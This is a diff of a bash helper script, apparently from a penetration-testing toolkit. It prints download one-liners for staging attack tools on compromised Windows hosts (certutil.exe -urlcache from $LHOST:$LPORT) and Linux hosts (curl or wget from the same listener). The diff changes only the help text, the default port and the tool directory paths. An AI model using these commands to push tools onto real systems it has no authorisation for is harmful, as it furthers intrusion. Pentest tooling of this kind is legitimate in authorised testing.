@@ -1,15 +1,15 @@
 #!/bin/bash
 
 function help() {
-    echo "Example: $0 -i tun0 -p 53"
-    echo "Example: $0 --interface eth0"
+    echo "Example: $0 -i tun0"
+    echo "Example: $0 --interface eth0 --port 80"
     echo ""
     echo "    -h, --help"
     echo "        Prints this message."
     echo "    -i, --interface    <INTERFACE>"
-    echo "        Set on which interface to listen (default: tun0)."
+    echo "        Set on which interface to listen."
     echo "    -p, --port    <PORT>"
-    echo "        Set on which port to listen (default: 8080)."
+    echo "        Set on which port to listen (default: 8000)."
     echo ""
     exit 1
 }
@@ -62,7 +62,7 @@ echo
 echo "WINDOWS TOOLS:"
 echo
 
-for TOOL in $(ls tools/w); do
+for TOOL in $(ls w); do
     TOOL_NAME=$(echo $TOOL | rev | cut -d'/' -f 1 | rev)
     echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/w/$TOOL_NAME $TOOL_NAME"
 done
@@ -71,7 +71,7 @@ echo
 echo
 echo "LINUX TOOLS:"
 echo
-for TOOL in $(ls tools/l); do
+for TOOL in $(ls l); do
     TOOL_NAME=$(echo $TOOL | rev | cut -d'/' -f 1 | rev)
     echo "curl http://$LHOST:$LPORT/l/$TOOL_NAME > $TOOL_NAME || wget http://$LHOST:$LPORT/l/$TOOL_NAME"
 done
